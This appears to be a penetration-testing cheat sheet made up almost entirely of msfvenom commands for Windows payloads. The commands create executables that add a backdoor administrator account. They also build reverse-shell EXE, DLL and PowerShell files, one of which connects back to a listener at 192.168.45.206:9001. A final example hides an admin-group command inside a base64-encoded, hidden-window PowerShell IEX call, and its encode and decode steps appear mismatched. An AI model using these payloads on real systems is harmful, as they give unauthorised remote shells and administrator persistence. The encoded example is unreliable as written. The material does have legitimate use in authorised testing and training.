# Reverse Shells - Command Execution

{% tabs %}
{% tab title="PowerShell" %}

{% endtab %}

{% tab title="msfvenom" %}
```powershell
# Add user payload
msfvenom -p windows/x64/adduser USER=misthos PASS=password123 -f exe -o adduser.exe

# Specific Command Execution
msfvenom -p windows/exec CMD='cmd.exe /c net user misthos Password123! /ADD & net localgroup administrators misthos /ADD' -f exe -o payload.exe

# DLL
msfvenom -p windows/x64/shell_reverse_tcp --arch x64 LHOST=192.168.45.206 LPORT=9001 -f dll -o payload.dll

# Classic Reverse Shell 
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<Port> -f exe -o shell.exe

# Reverse PowerShell
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<Port> -f psh -o shell.ps1
```
{% endtab %}
{% endtabs %}

#### Add User Payload Using PowerShell (msfconsole)

```powershell
  # Create a PowerShell command that adds the user
  # First, base64 encode your command
  powershell -Command "Write-Host ([Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('net localgroup administrators themis /add')))"

  # Output: NABlAHQAIABsAG8AYwBhAGwAZwByAG8AdQBwACAAYQBkAG0AaQBuAGkAcwB0...

  # Create payload with encoded command
  msfvenom -p windows/exec CMD='powershell -nop -w hidden -c "IEX ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(\"NABlAHQAIABsAG8AYwBhAGwAZwByAG8AdQBwACAAYQBkA
  G0AaQBuAGkAcwB0AHIAYQB0AG8AcgBzACAAdABoAGUAbQBpAHMAIAAvAGEAZABkACIA\")))"' -f exe -o adduser.exe
```
